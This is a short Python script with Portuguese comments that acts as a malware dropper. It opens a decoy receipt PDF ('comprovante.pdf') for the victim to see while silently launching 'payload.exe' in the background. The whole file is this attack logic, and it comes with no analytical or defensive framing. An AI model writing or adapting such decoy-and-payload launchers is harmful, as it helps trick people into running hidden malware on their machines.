import os
import subprocess

# Abre o PDF verdadeiro
subprocess.Popen(['start', '', 'comprovante.pdf'], shell=True)

# Executa o payload em segundo plano
subprocess.Popen(['payload.exe'], shell=True)
